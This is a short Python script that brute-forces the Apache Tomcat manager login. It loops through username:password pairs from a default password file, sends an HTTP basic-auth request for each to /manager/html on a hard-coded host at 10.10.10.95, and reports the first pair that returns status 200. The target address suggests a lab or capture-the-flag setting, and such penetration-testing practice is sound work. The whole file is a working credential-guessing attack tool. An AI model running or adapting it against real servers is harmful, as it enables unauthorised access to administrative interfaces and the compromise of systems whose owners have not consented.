#!/usr/bin/env python
# used to brute force tomcat manager login
import requests
import sys

with open('defaultpasslist.txt') as pass_file:
	for line in pass_file:
		cred = line.strip('\n').split(":")
		response = requests.get('http://10.10.10.95:8080/manager/html', auth=(cred[0], cred[1]))

		if response.status_code == 200:
			print("Found valid credentials \"" + line.strip('\n') + "\"")
			raise sys.exit()